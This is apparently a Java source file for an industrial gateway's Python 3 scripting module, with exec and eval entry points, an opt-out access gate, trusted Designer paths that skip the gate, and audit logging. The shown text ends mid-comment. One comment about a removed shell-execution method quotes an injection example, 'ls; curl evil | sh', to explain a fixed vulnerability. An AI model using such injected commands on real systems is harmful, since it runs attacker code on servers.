package com.gaskony.python3.gateway;

import com.gaskony.python3.Python3RpcFunctions;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.time.Instant;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;

/**
 * Gateway implementation of Python 3 scripting functions.
 * Executes Python code directly via the process pool.
 * Also implements RPC interface so Designer/Client can call these functions remotely.
 */
public class Python3ScriptModule implements Python3RpcFunctions {

    private static final Logger logger = LoggerFactory.getLogger(Python3ScriptModule.class);

    /**
     * Default mode passed downstream to the pool/bridge for backward
     * compatibility with existing audit-log expectations. Real access control
     * happens via {@link #roleResolver} before this constant is ever read.
     *
     * @since v3.13.0 (C13)
     */
    private static final String DEFAULT_SECURITY_MODE = SecurityMode.DESIGNER_ADMIN.getValue();

    /**
     * Role resolver used to gate Jython scripting-function invocations of
     * {@code system.python3.*}. Volatile + static so a single test override
     * applies to every instance; the default delegates to
     * {@link RoleResolver#getDefault()}.
     *
     * @since v3.13.0 (C13)
     */
    private static volatile RoleResolver roleResolver = RoleResolver.getDefault();

    /**
     * Test hook: replaces the default {@link RoleResolver} with a stub.
     * Production code must never call this. Pass {@code null} to revert to
     * the default resolver after a test.
     */
    static void setRoleResolverForTesting(RoleResolver resolver) {
        roleResolver = (resolver != null) ? resolver : RoleResolver.getDefault();
    }

    private final GatewayHook gatewayHook;

    public Python3ScriptModule(GatewayHook gatewayHook) {
        this.gatewayHook = gatewayHook;
        logger.info("Python3ScriptModule created");
    }

    /**
     * Enforce the runtime scripting opt-out gate for {@code system.python3.*}
     * entry-points reached from Jython. Throws a {@link RuntimeException}
     * (Jython propagates Java exceptions to Python with the message intact)
     * if the gateway administrator has disabled scripting access.
     *
     * <p>Allow-by-default per charter &sect;2 (2026-07-02); see
     * {@link RoleResolver#requireScriptingAllowed()}.</p>
     *
     * @since v3.13.0 (C13); semantics flipped to opt-out in v4.3.0
     */
    private void requireAdministrator(String binding) {
        try {
            roleResolver.requireScriptingAllowed();
        } catch (SecurityException e) {
            logger.warn("system.python3.{} denied: {}", binding, e.getMessage());
            // Wrap as RuntimeException with the same message so Jython surfaces
            // a clear error to script callers without exposing a stack trace.
            throw new RuntimeException(e.getMessage());
        }
    }

    /**
     * Lazily get the default process pool from the gateway hook.
     * This allows the script module to be registered before the pool is initialized.
     * Made public in v2.14.0 Phase 2 Week 3-4 for REST API monitoring endpoints.
     */
    public Python3ProcessPool getProcessPool() {
        return gatewayHook.getProcessPool();
    }

    /**
     * Get the pool manager for multi-version access (v3.1.0).
     */
    public PoolManager getPoolManager() {
        return gatewayHook.getPoolManager();
    }

    /**
     * Get a process pool for a specific Python version (v3.1.0).
     *
     * @param pythonVersion the desired Python version (e.g., "3.11"), null for default
     * @return the pool for that version
     * @throws RuntimeException if version is not available
     */
    public Python3ProcessPool getPoolForVersion(String pythonVersion) {
        PoolManager manager = getPoolManager();
        if (manager == null) {
            // Fallback: no pool manager, return default
            return getProcessPool();
        }
        try {
            return manager.getPool(pythonVersion);
        } catch (PoolManager.VersionNotAvailableException e) {
            throw new RuntimeException(e.getMessage(), e);
        }
    }

    /**
     * Get list of available Python versions (v3.1.0).
     *
     * @return list of version strings, or empty list if pool manager not initialized
     */
    public List<String> getAvailableVersions() {
        PoolManager manager = getPoolManager();
        if (manager == null) {
            return Collections.emptyList();
        }
        return manager.getAvailableVersions();
    }

    /**
     * Get the default Python version (v3.1.0).
     *
     * @return default version string, or null if pool manager not initialized
     */
    public String getDefaultVersion() {
        PoolManager manager = getPoolManager();
        return manager != null ? manager.getDefaultVersion() : null;
    }

    /**
     * Lazily get the distribution manager from the gateway hook.
     */
    private PythonDistributionManager getDistributionManager() {
        return gatewayHook.getDistributionManager();
    }

    /**
     * Lazily get the script repository from the gateway hook.
     */
    private Python3ScriptRepository getScriptRepository() {
        return gatewayHook.getScriptRepository();
    }

    /**
     * Lazily get the audit logger from the gateway hook (v2.6.0).
     */
    private Python3AuditLogger getAuditLogger() {
        return gatewayHook.getAuditLogger();
    }

    /**
     * Execute Python 3 code and return the result.
     *
     * @param code Python code to execute
     * @return Result of execution
     */
    public Object exec(String code) throws Exception {
        return exec(code, Collections.emptyMap());
    }

    /**
     * Execute Python 3 code with variables and return the result.
     *
     * @param code      Python code to execute
     * @param variables Dictionary of variables to pass to Python
     * @return Result of execution
     */
    @Override
    public Object exec(String code, Map<String, Object> variables) throws Exception {
        return exec(code, variables, DEFAULT_SECURITY_MODE);
    }

    /**
     * Execute Python 3 code with a specific Python version (v3.1.0).
     *
     * @param code          Python code to execute
     * @param variables     Dictionary of variables to pass to Python
     * @param securityMode  Security mode: "DESIGNER_ADMIN" or "ADMIN" (legacy "RESTRICTED" maps to DESIGNER_ADMIN; see C13)
     * @param pythonVersion Python version to use (e.g., "3.11"), null for default
     * @return Result of execution
     */
    public Object exec(String code, Map<String, Object> variables, String securityMode, String pythonVersion) throws Exception {
        return execWithVersion(code, variables, securityMode, pythonVersion);
    }

    /**
     * Execute Python 3 code with variables and security mode.
     *
     * @param code         Python code to execute
     * @param variables    Dictionary of variables to pass to Python
     * @param securityMode Security mode: "DESIGNER_ADMIN" or "ADMIN" (legacy "RESTRICTED" maps to DESIGNER_ADMIN; see C13)
     * @return Result of execution
     */
    public Object exec(String code, Map<String, Object> variables, String securityMode) throws Exception {
        // C13: runtime scripting opt-out gate at the Jython entry-point (allow-by-default since v4.3.0).
        requireAdministrator("exec");
        return execCore(code, variables, securityMode);
    }

    /**
     * Ungated core of {@link #exec(String, Map, String)}. Runs the same
     * validation, pool dispatch, and audit logging as the public entry-point
     * but deliberately skips the {@link #requireAdministrator(String)} gate.
     * Used directly by the trusted Designer RPC path ({@link #execTrusted}).
     *
     * @since v4.3.0 (Designer RPC path must not depend on the scripting opt-out; charter &sect;2, 2026-07-02)
     */
    private Object execCore(String code, Map<String, Object> variables, String securityMode) throws Exception {
        // Defensive null checks
        if (code == null) {
            throw new IllegalArgumentException("code parameter cannot be null");
        }
        if (variables == null) {
            variables = Collections.emptyMap();
        }
        if (securityMode == null) {
            securityMode = DEFAULT_SECURITY_MODE;
        }

        logger.debug("exec() called with code length: {}, security mode: {}",
                    code.length(), securityMode);

        // Audit logging (v2.6.0)
        Instant startTime = Instant.now();
        String codeHash = Python3SecurityUtils.hashCode(code);
        SecurityMode mode = SecurityMode.fromString(securityMode);
        boolean success = false;
        String errorMessage = null;

        try {
            Python3ProcessPool pool = getProcessPool();
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized. Check Gateway logs for initialization errors.";
                logger.error(errorMsg);
                errorMessage = errorMsg;
                throw new RuntimeException(errorMsg);
            }

            logger.debug("Executing Python code via process pool");
            Python3Result result = pool.execute(code, variables != null ? variables : Collections.emptyMap(), securityMode);

            if (result.isSuccess()) {
                logger.debug("Python code executed successfully");
                success = true;
                return result.getResult();
            } else {
                String errorMsg = "Python error: " + result.getError();
                if (result.getTraceback() != null) {
                    errorMsg += "\n" + result.getTraceback();
                }
                logger.error(errorMsg);
                errorMessage = result.getError(); // Store original error for audit
                throw new RuntimeException(errorMsg);
            }

        } catch (Python3Exception e) {
            logger.error("Failed to execute Python code", e);
            errorMessage = e.getMessage();
            throw new RuntimeException("Failed to execute Python code: " + e.getMessage(), e);
        } finally {
            // Always log audit event (success or failure)
            long durationMs = java.time.Duration.between(startTime, Instant.now()).toMillis();
            Python3AuditLogger auditLogger = getAuditLogger();
            if (auditLogger != null) {
                Python3AuditEvent event = new Python3AuditEvent(
                    startTime,
                    Python3SecurityUtils.getCurrentUser(),
                    Python3SecurityUtils.getSourceIP(),
                    mode,
                    codeHash,
                    success,
                    durationMs,
                    errorMessage,
                    Python3SecurityUtils.getEndpoint("SCRIPT", "system.python3.exec")
                );
                auditLogger.logExecution(event);
            }
        }
    }

    /**
     * Execute Python 3 code with a specific version (v3.1.0 internal).
     * Routes to the correct pool based on pythonVersion.
     */
    private Object execWithVersion(String code, Map<String, Object> variables,
                                   String securityMode, String pythonVersion) throws Exception {
        // C13: role gate (mirrors public exec(); private callers can only reach
        // here via the public overload, but the duplicate gate is defence-in-depth).
        requireAdministrator("exec");
        return execCoreVersioned(code, variables, securityMode, pythonVersion);
    }

    /**
     * Ungated core of {@link #execWithVersion}. See {@link #execCore} for the
     * rationale; this variant routes to the pool for a specific Python
     * version. Used directly by {@link #execTrusted} when a version is given.
     *
     * @since v4.3.0
     */
    private Object execCoreVersioned(String code, Map<String, Object> variables,
                                     String securityMode, String pythonVersion) throws Exception {
        if (code == null) {
            throw new IllegalArgumentException("code parameter cannot be null");
        }
        if (variables == null) {
            variables = Collections.emptyMap();
        }
        if (securityMode == null) {
            securityMode = DEFAULT_SECURITY_MODE;
        }

        logger.debug("execWithVersion() called: version={}, code length: {}", pythonVersion, code.length());

        Instant startTime = Instant.now();
        String codeHash = Python3SecurityUtils.hashCode(code);
        SecurityMode mode = SecurityMode.fromString(securityMode);
        boolean success = false;
        String errorMessage = null;

        try {
            Python3ProcessPool pool = getPoolForVersion(pythonVersion);
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized for version: " + pythonVersion;
                logger.error(errorMsg);
                errorMessage = errorMsg;
                throw new RuntimeException(errorMsg);
            }

            Python3Result result = pool.execute(code, variables, securityMode);

            if (result.isSuccess()) {
                success = true;
                return result.getResult();
            } else {
                String errorMsg = "Python error: " + result.getError();
                if (result.getTraceback() != null) {
                    errorMsg += "\n" + result.getTraceback();
                }
                errorMessage = result.getError();
                throw new RuntimeException(errorMsg);
            }
        } catch (Python3Exception e) {
            errorMessage = e.getMessage();
            throw new RuntimeException("Failed to execute Python code: " + e.getMessage(), e);
        } finally {
            long durationMs = java.time.Duration.between(startTime, Instant.now()).toMillis();
            Python3AuditLogger auditLogger = getAuditLogger();
            if (auditLogger != null) {
                Python3AuditEvent event = new Python3AuditEvent(
                    startTime,
                    Python3SecurityUtils.getCurrentUser(),
                    Python3SecurityUtils.getSourceIP(),
                    mode, codeHash, success, durationMs, errorMessage,
                    Python3SecurityUtils.getEndpoint("SCRIPT", "system.python3.exec")
                );
                auditLogger.logExecution(event);
            }
        }
    }

    /**
     * Trusted entry point for the Designer RPC path ({@code Python3RpcHandler.exec}).
     * Runs the same core logic (validation, pool dispatch, audit logging) as
     * the public {@code exec(...)} overloads but deliberately skips the
     * {@link #requireAdministrator(String)} / runtime-scripting-opt-out gate:
     * per charter &sect;2 (2026-07-02), an authenticated Designer session must
     * always be able to develop/test, independent of whether a Gateway
     * administrator has disabled the {@code system.python3.*} runtime
     * opt-out. Authorisation for this path is the caller's responsibility
     * ({@code Python3RpcHandler.requireDesignerSession()}).
     *
     * @param code          Python code to execute
     * @param variables     Dictionary of variables to pass to Python
     * @param pythonVersion Python version to use (e.g. "3.11"); {@code null} or blank selects the default pool
     * @return Result of execution
     * @since v4.3.0
     */
    Object execTrusted(String code, Map<String, Object> variables, String pythonVersion) throws Exception {
        if (pythonVersion == null || pythonVersion.isBlank()) {
            return execCore(code, variables, DEFAULT_SECURITY_MODE);
        }
        return execCoreVersioned(code, variables, DEFAULT_SECURITY_MODE, pythonVersion);
    }

    /**
     * Evaluate a Python 3 expression and return the result.
     *
     * @param expression Python expression to evaluate
     * @return Result of expression
     */
    public Object eval(String expression) throws Exception {
        return eval(expression, Collections.emptyMap());
    }

    /**
     * Evaluate a Python 3 expression with variables and return the result.
     *
     * @param expression Python expression to evaluate
     * @param variables  Dictionary of variables to pass to Python
     * @return Result of expression
     */
    @Override
    public Object eval(String expression, Map<String, Object> variables) throws Exception {
        return eval(expression, variables, DEFAULT_SECURITY_MODE);
    }

    /**
     * Evaluate a Python 3 expression with version selection (v3.1.0).
     *
     * @param expression    Python expression to evaluate
     * @param variables     Dictionary of variables to pass to Python
     * @param securityMode  Security mode: "DESIGNER_ADMIN" or "ADMIN" (legacy "RESTRICTED" maps to DESIGNER_ADMIN; see C13)
     * @param pythonVersion Python version to use (e.g., "3.11"), null for default
     * @return Result of expression
     */
    public Object eval(String expression, Map<String, Object> variables, String securityMode, String pythonVersion) throws Exception {
        return evalWithVersion(expression, variables, securityMode, pythonVersion);
    }

    /**
     * Evaluate a Python 3 expression with variables and security mode.
     *
     * @param expression   Python expression to evaluate
     * @param variables    Dictionary of variables to pass to Python
     * @param securityMode Security mode: "DESIGNER_ADMIN" or "ADMIN" (legacy "RESTRICTED" maps to DESIGNER_ADMIN; see C13)
     * @return Result of expression
     */
    public Object eval(String expression, Map<String, Object> variables, String securityMode) throws Exception {
        // C13: runtime scripting opt-out gate at the Jython entry-point (allow-by-default since v4.3.0).
        requireAdministrator("eval");
        return evalCore(expression, variables, securityMode);
    }

    /**
     * Ungated core of {@link #eval(String, Map, String)}. Runs the same
     * validation, pool dispatch, and audit logging as the public entry-point
     * but deliberately skips the {@link #requireAdministrator(String)} gate.
     * Used directly by the trusted Designer RPC path ({@link #evalTrusted}).
     *
     * @since v4.3.0 (Designer RPC path must not depend on the scripting opt-out; charter &sect;2, 2026-07-02)
     */
    private Object evalCore(String expression, Map<String, Object> variables, String securityMode) throws Exception {
        // Defensive null checks
        if (expression == null) {
            throw new IllegalArgumentException("expression parameter cannot be null");
        }
        if (variables == null) {
            variables = Collections.emptyMap();
        }
        if (securityMode == null) {
            securityMode = DEFAULT_SECURITY_MODE;
        }

        logger.debug("eval() called with expression: {}, security mode: {}", expression, securityMode);

        // Audit logging (v2.6.0)
        Instant startTime = Instant.now();
        String codeHash = Python3SecurityUtils.hashCode(expression);
        SecurityMode mode = SecurityMode.fromString(securityMode);
        boolean success = false;
        String errorMessage = null;

        try {
            Python3ProcessPool pool = getProcessPool();
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized. Check Gateway logs for initialization errors.";
                logger.error(errorMsg);
                errorMessage = errorMsg;
                throw new RuntimeException(errorMsg);
            }

            logger.debug("Evaluating Python expression via process pool");
            Python3Result result = pool.evaluate(expression, variables != null ? variables : Collections.emptyMap(), securityMode);

            if (result.isSuccess()) {
                logger.debug("Python expression evaluated successfully");
                success = true;
                return result.getResult();
            } else {
                String errorMsg = "Python error: " + result.getError();
                if (result.getTraceback() != null) {
                    errorMsg += "\n" + result.getTraceback();
                }
                logger.error(errorMsg);
                errorMessage = result.getError(); // Store original error for audit
                throw new RuntimeException(errorMsg);
            }

        } catch (Python3Exception e) {
            logger.error("Failed to evaluate Python expression", e);
            errorMessage = e.getMessage();
            throw new RuntimeException("Failed to evaluate Python expression: " + e.getMessage(), e);
        } finally {
            // Always log audit event (success or failure)
            long durationMs = java.time.Duration.between(startTime, Instant.now()).toMillis();
            Python3AuditLogger auditLogger = getAuditLogger();
            if (auditLogger != null) {
                Python3AuditEvent event = new Python3AuditEvent(
                    startTime,
                    Python3SecurityUtils.getCurrentUser(),
                    Python3SecurityUtils.getSourceIP(),
                    mode,
                    codeHash,
                    success,
                    durationMs,
                    errorMessage,
                    Python3SecurityUtils.getEndpoint("SCRIPT", "system.python3.eval")
                );
                auditLogger.logExecution(event);
            }
        }
    }

    /**
     * Evaluate a Python 3 expression with a specific version (v3.1.0 internal).
     */
    private Object evalWithVersion(String expression, Map<String, Object> variables,
                                   String securityMode, String pythonVersion) throws Exception {
        // C13: role gate (defence-in-depth alongside the public eval() gate).
        requireAdministrator("eval");
        return evalCoreVersioned(expression, variables, securityMode, pythonVersion);
    }

    /**
     * Ungated core of {@link #evalWithVersion}. See {@link #evalCore} for the
     * rationale; this variant routes to the pool for a specific Python
     * version. Used directly by {@link #evalTrusted} when a version is given.
     *
     * @since v4.3.0
     */
    private Object evalCoreVersioned(String expression, Map<String, Object> variables,
                                     String securityMode, String pythonVersion) throws Exception {
        if (expression == null) {
            throw new IllegalArgumentException("expression parameter cannot be null");
        }
        if (variables == null) {
            variables = Collections.emptyMap();
        }
        if (securityMode == null) {
            securityMode = DEFAULT_SECURITY_MODE;
        }

        logger.debug("evalWithVersion() called: version={}, expression: {}", pythonVersion, expression);

        Instant startTime = Instant.now();
        String codeHash = Python3SecurityUtils.hashCode(expression);
        SecurityMode mode = SecurityMode.fromString(securityMode);
        boolean success = false;
        String errorMessage = null;

        try {
            Python3ProcessPool pool = getPoolForVersion(pythonVersion);
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized for version: " + pythonVersion;
                errorMessage = errorMsg;
                throw new RuntimeException(errorMsg);
            }

            Python3Result result = pool.evaluate(expression, variables, securityMode);

            if (result.isSuccess()) {
                success = true;
                return result.getResult();
            } else {
                String errorMsg = "Python error: " + result.getError();
                if (result.getTraceback() != null) {
                    errorMsg += "\n" + result.getTraceback();
                }
                errorMessage = result.getError();
                throw new RuntimeException(errorMsg);
            }
        } catch (Python3Exception e) {
            errorMessage = e.getMessage();
            throw new RuntimeException("Failed to evaluate Python expression: " + e.getMessage(), e);
        } finally {
            long durationMs = java.time.Duration.between(startTime, Instant.now()).toMillis();
            Python3AuditLogger auditLogger = getAuditLogger();
            if (auditLogger != null) {
                Python3AuditEvent event = new Python3AuditEvent(
                    startTime,
                    Python3SecurityUtils.getCurrentUser(),
                    Python3SecurityUtils.getSourceIP(),
                    mode, codeHash, success, durationMs, errorMessage,
                    Python3SecurityUtils.getEndpoint("SCRIPT", "system.python3.eval")
                );
                auditLogger.logExecution(event);
            }
        }
    }

    /**
     * Trusted entry point for the Designer RPC path ({@code Python3RpcHandler.eval}).
     * Runs the same core logic (validation, pool dispatch, audit logging) as
     * the public {@code eval(...)} overloads but deliberately skips the
     * {@link #requireAdministrator(String)} / runtime-scripting-opt-out gate:
     * per charter &sect;2 (2026-07-02), an authenticated Designer session must
     * always be able to develop/test, independent of whether a Gateway
     * administrator has disabled the {@code system.python3.*} runtime
     * opt-out. Authorisation for this path is the caller's responsibility
     * ({@code Python3RpcHandler.requireDesignerSession()}).
     *
     * @param expression    Python expression to evaluate
     * @param variables     Dictionary of variables to pass to Python
     * @param pythonVersion Python version to use (e.g. "3.11"); {@code null} or blank selects the default pool
     * @return Result of expression
     * @since v4.3.0
     */
    Object evalTrusted(String expression, Map<String, Object> variables, String pythonVersion) throws Exception {
        if (pythonVersion == null || pythonVersion.isBlank()) {
            return evalCore(expression, variables, DEFAULT_SECURITY_MODE);
        }
        return evalCoreVersioned(expression, variables, DEFAULT_SECURITY_MODE, pythonVersion);
    }

    /**
     * Call a function from a Python 3 module.
     *
     * @param moduleName   Module name (e.g., "math")
     * @param functionName Function name (e.g., "sqrt")
     * @param args         List of positional arguments
     * @return Result of function call
     */
    @Override
    public Object callModule(String moduleName, String functionName, List<Object> args) throws Exception {
        return callModule(moduleName, functionName, args, Collections.emptyMap());
    }

    /**
     * Call a function from a Python 3 module with keyword arguments.
     *
     * @param moduleName   Module name (e.g., "math")
     * @param functionName Function name (e.g., "sqrt")
     * @param args         List of positional arguments
     * @param kwargs       Dictionary of keyword arguments
     * @return Result of function call
     */
    public Object callModule(String moduleName, String functionName, List<Object> args, Map<String, Object> kwargs) {
        return callModule(moduleName, functionName, args, kwargs, DEFAULT_SECURITY_MODE);
    }

    /**
     * Call a function from a Python 3 module with keyword arguments and security mode.
     *
     * @param moduleName   Module name (e.g., "math")
     * @param functionName Function name (e.g., "sqrt")
     * @param args         List of positional arguments
     * @param kwargs       Dictionary of keyword arguments
     * @param securityMode Security mode: "DESIGNER_ADMIN" or "ADMIN" (legacy "RESTRICTED" maps to DESIGNER_ADMIN; see C13)
     * @return Result of function call
     */
    public Object callModule(String moduleName, String functionName, List<Object> args, Map<String, Object> kwargs, String securityMode) {
        // C13: Administrator role gate at the Jython entry-point.
        requireAdministrator("callModule");

        logger.debug("callModule() called: {}.{}(), security mode: {}", moduleName, functionName, securityMode);

        try {
            Python3ProcessPool pool = getProcessPool();
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized. Check Gateway logs for initialization errors.";
                logger.error(errorMsg);
                throw new RuntimeException(errorMsg);
            }

            logger.debug("Calling Python module function via process pool");
            Python3Result result = pool.callModule(
                moduleName,
                functionName,
                args != null ? args : Collections.emptyList(),
                kwargs != null ? kwargs : Collections.emptyMap(),
                securityMode
            );

            if (result.isSuccess()) {
                logger.debug("Python module function called successfully");
                return result.getResult();
            } else {
                String errorMsg = "Python error: " + result.getError();
                if (result.getTraceback() != null) {
                    errorMsg += "\n" + result.getTraceback();
                }
                logger.error(errorMsg);
                throw new RuntimeException(errorMsg);
            }

        } catch (Python3Exception e) {
            logger.error("Failed to call Python module function", e);
            throw new RuntimeException("Failed to call Python module function: " + e.getMessage(), e);
        }
    }

    // execShell() / escapeForPython() were removed in this fix-pass (security finding C16).
    //
    // Rationale: the previous implementation interpolated a user-supplied command
    // string into Python source code and executed it with `subprocess.run(<cmd>,
    // shell=True, ...)`. The naive single-quote escape (only \\, ', \n) plus
    // shell=True made it a classic shell-injection sink — submitting
    //     command="ls; curl evil | sh"
    // would run the second command as the Gateway service user.
    //
    // The corresponding Python feature was already removed from python_bridge.py
    // (v2.9.0). Removing the Java entry-point closes the Jython-side
    // `system.python3.execShell(...)` exposure as well.
    //
    // See /modules/.review/fixes/C16.md for the deprecation note.

    /**
     * Check if Python 3 is available and the process pool is healthy.
     *
     * @return true if Python 3 is available
     */
    @Override
    public boolean isAvailable() {
        Python3ProcessPool pool = getProcessPool();
        boolean available = pool != null && !pool.isShutdown();
        logger.debug("isAvailable() = {}", available);
        return available;
    }

    /**
     * Get Python 3 version information.
     *
     * @return Dictionary with version information
     */
    @Override
    public Map<String, Object> getVersion() {
        logger.debug("getVersion() called");

        try {
            Python3ProcessPool pool = getProcessPool();
            if (pool == null) {
                Map<String, Object> versionInfo = new HashMap<>();
                versionInfo.put("available", false);
                versionInfo.put("error", "Python 3 process pool is not initialized");
                logger.warn("getVersion() - pool not initialized");
                return versionInfo;
            }

            // v2.0.17: Use ADMIN mode to allow sys import (safe read-only operation)
            Python3Result result = pool.execute("import sys; result = sys.version", Collections.emptyMap(), "ADMIN");

            if (result.isSuccess()) {
                Map<String, Object> versionInfo = new HashMap<>();
                versionInfo.put("version", result.getResult());
                versionInfo.put("available", true);
                logger.debug("getVersion() successful: {}", result.getResult());
                return versionInfo;
            } else {
                Map<String, Object> versionInfo = new HashMap<>();
                versionInfo.put("available", false);
                versionInfo.put("error", result.getError());
                logger.error("getVersion() failed: {}", result.getError());
                return versionInfo;
            }

        } catch (Exception e) {
            logger.error("Failed to get Python version", e);
            Map<String, Object> versionInfo = new HashMap<>();
            versionInfo.put("available", false);
            versionInfo.put("error", e.getMessage());
            return versionInfo;
        }
    }

    /**
     * Get process pool statistics.
     *
     * @return Dictionary with pool statistics
     */
    @Override
    public Map<String, Object> getPoolStats() {
        logger.debug("getPoolStats() called");

        Python3ProcessPool pool = getProcessPool();
        if (pool == null) {
            Map<String, Object> statsMap = new HashMap<>();
            statsMap.put("error", "Python 3 process pool is not initialized");
            logger.warn("getPoolStats() - pool not initialized");
            return statsMap;
        }

        Python3ProcessPool.PoolStats stats = pool.getStats();

        Map<String, Object> statsMap = new HashMap<>();
        statsMap.put("poolSize", stats.totalSize);
        statsMap.put("available", stats.available);
        statsMap.put("inUse", stats.inUse);
        statsMap.put("healthy", stats.healthy);

        logger.debug("getPoolStats() - total: {}, available: {}, inUse: {}, healthy: {}",
            stats.totalSize, stats.available, stats.inUse, stats.healthy);

        return statsMap;
    }

    /**
     * Live execution statistics from the pool's {@link MetricsCollector} — the
     * collector that is actually fed by every borrow/return in
     * {@link Python3ProcessPool}. (v4.4.0: the Designer Diagnostics dialog
     * previously read a *different*, never-incremented collector, so Total
     * Executions / Success Rate / Avg Time were permanently zero.)
     *
     * @return map with totalExecutions, successfulExecutions, failedExecutions,
     *         averageExecutionTime (ms), successRate (0..1), and p50/p95/p99
     *         response times; or an {@code error} entry if the pool is down.
     */
    public Map<String, Object> getExecutionStats() {
        Map<String, Object> out = new HashMap<>();
        Python3ProcessPool pool = getProcessPool();
        if (pool == null) {
            out.put("error", "Python 3 process pool is not initialized");
            out.put("totalExecutions", 0L);
            out.put("successfulExecutions", 0L);
            out.put("failedExecutions", 0L);
            out.put("averageExecutionTime", 0.0);
            out.put("successRate", 0.0);
            return out;
        }
        MetricsCollector m = pool.getMetricsCollector();
        out.put("totalExecutions", m.getTotalExecutions());
        out.put("successfulExecutions", m.getSuccessfulExecutions());
        out.put("failedExecutions", m.getFailedExecutions());
        out.put("averageExecutionTime", (double) m.getAverageResponseTime());
        out.put("successRate", m.getSuccessRate());
        out.put("p50ResponseTime", m.getP50ResponseTime());
        out.put("p95ResponseTime", m.getP95ResponseTime());
        out.put("p99ResponseTime", m.getP99ResponseTime());
        return out;
    }

    /**
     * Resize the process pool to a new size (1-20).
     *
     * @param newSize the new pool size (1-20)
     * @throws IllegalArgumentException if newSize is out of range
     * @throws IllegalStateException if pool is not initialized or shutdown
     *
     * v1.17.2: Added for dynamic pool size adjustment
     */
    public void resizePool(int newSize) {
        logger.debug("resizePool() called with newSize: {}", newSize);

        Python3ProcessPool pool = getProcessPool();
        if (pool == null) {
            String errorMsg = "Python 3 process pool is not initialized";
            logger.error(errorMsg);
            throw new IllegalStateException(errorMsg);
        }

        pool.resizePool(newSize);
        logger.info("Process pool resized to {}", newSize);
    }

    /**
     * Execute a simple Python 3 example (for testing).
     *
     * @return Example result
     */
    @Override
    public String example() throws Exception {
        logger.info("example() called - running test");

        try {
            // Test basic math
            Object result = eval("2 ** 100");
            String successMsg = "Python 3 is working! 2^100 = " + result;
            logger.info("example() successful");
            return successMsg;

        } catch (Exception e) {
            String errorMsg = "Python 3 error: " + e.getMessage();
            logger.error("example() failed: {}", errorMsg);
            return errorMsg;
        }
    }

    /**
     * Get Python distribution status and installation info.
     *
     * @return Dictionary with distribution information
     */
    @Override
    public Map<String, Object> getDistributionInfo() {
        logger.debug("getDistributionInfo() called");

        PythonDistributionManager manager = getDistributionManager();
        if (manager != null) {
            Map<String, Object> info = manager.getStatus();
            logger.debug("getDistributionInfo() returned status");
            return info;
        } else {
            Map<String, Object> info = new HashMap<>();
            info.put("available", false);
            info.put("error", "Distribution manager not initialized");
            logger.warn("getDistributionInfo() - manager not initialized");
            return info;
        }
    }

    /**
     * Call a saved Python script by path with arguments.
     * The script's 'result' variable will be returned.
     *
     * @param scriptPath Path to the script (e.g., "My Script" or "Folder/My Script")
     * @param args       Positional arguments to pass to the script
     * @param kwargs     Keyword arguments to pass to the script
     * @return The value of the 'result' variable from the script
     * @throws Exception if script not found or execution fails
     */
    @Override
    public Object callScript(String scriptPath, List<Object> args, Map<String, Object> kwargs) throws Exception {
        // C13: Administrator role gate at the Jython entry-point.
        // callScript executes a saved Python source from the repository which is
        // authored by Designers/Administrators, but the *invocation* of that
        // script via system.python3.callScript still grants the caller arbitrary
        // Python execution capability. Gate at the same level as exec/eval.
        requireAdministrator("callScript");

        logger.debug("callScript() called with path: {}", scriptPath);

        try {
            // Load the script from repository
            Python3ScriptRepository repository = getScriptRepository();
            if (repository == null) {
                String errorMsg = "Script repository is not initialized";
                logger.error(errorMsg);
                throw new RuntimeException(errorMsg);
            }

            Python3ScriptRepository.SavedScript script = repository.loadScriptByPath(scriptPath);
            if (script == null) {
                String errorMsg = "Script not found: " + scriptPath;
                logger.error(errorMsg);
                throw new RuntimeException(errorMsg);
            }

            logger.debug("Loaded script: {} with code length: {}", script.getName(), script.getCode().length());

            // Prepare variables to inject into the script
            Map<String, Object> variables = new HashMap<>();
            if (args != null) {
                variables.put("args", args);
            } else {
                variables.put("args", Collections.emptyList());
            }
            if (kwargs != null) {
                variables.put("kwargs", kwargs);
            } else {
                variables.put("kwargs", Collections.emptyMap());
            }

            logger.debug("Executing script with {} args and {} kwargs",
                args != null ? args.size() : 0,
                kwargs != null ? kwargs.size() : 0);

            // Execute the script
            Python3ProcessPool pool = getProcessPool();
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized. Check Gateway logs for initialization errors.";
                logger.error(errorMsg);
                throw new RuntimeException(errorMsg);
            }

            Python3Result result = pool.execute(script.getCode(), variables);

            if (result.isSuccess()) {
                logger.debug("Script executed successfully");
                return result.getResult();
            } else {
                String errorMsg = "Python error in script '" + scriptPath + "': " + result.getError();
                if (result.getTraceback() != null) {
                    errorMsg += "\n" + result.getTraceback();
                }
                logger.error(errorMsg);
                throw new RuntimeException(errorMsg);
            }

        } catch (Python3Exception e) {
            logger.error("Failed to execute script: {}", scriptPath, e);
            throw new RuntimeException("Failed to execute script '" + scriptPath + "': " + e.getMessage(), e);
        }
    }

    /**
     * Call a saved Python script by path (without arguments).
     *
     * @param scriptPath Path to the script
     * @return The value of the 'result' variable from the script
     * @throws Exception if script not found or execution fails
     */
    public Object callScript(String scriptPath) throws Exception {
        return callScript(scriptPath, Collections.emptyList(), Collections.emptyMap());
    }

    /**
     * Get list of available saved scripts with metadata.
     * Useful for autocomplete helpers and script browsers.
     *
     * @return List of script metadata maps (name, description, path, author, version)
     */
    @Override
    public List<Map<String, Object>> getAvailableScripts() {
        logger.debug("getAvailableScripts() called");

        Python3ScriptRepository repository = getScriptRepository();
        if (repository == null) {
            logger.warn("getAvailableScripts() - repository not initialized");
            return Collections.emptyList();
        }

        List<Python3ScriptRepository.ScriptMetadata> scripts = repository.listScripts();

        return scripts.stream()
            .map(script -> {
                Map<String, Object> metadata = new HashMap<>();
                metadata.put("name", script.getName());
                metadata.put("description", script.getDescription() != null ? script.getDescription() : "");
                metadata.put("path", buildScriptPath(script));
                metadata.put("author", script.getAuthor() != null ? script.getAuthor() : "");
                metadata.put("version", script.getVersion() != null ? script.getVersion() : "1.0");
                metadata.put("lastModified", script.getLastModified() != null ? script.getLastModified() : "");
                return metadata;
            })
            .collect(Collectors.toList());
    }

    /**
     * Build full script path from metadata (folder/name format).
     *
     * @param script Script metadata
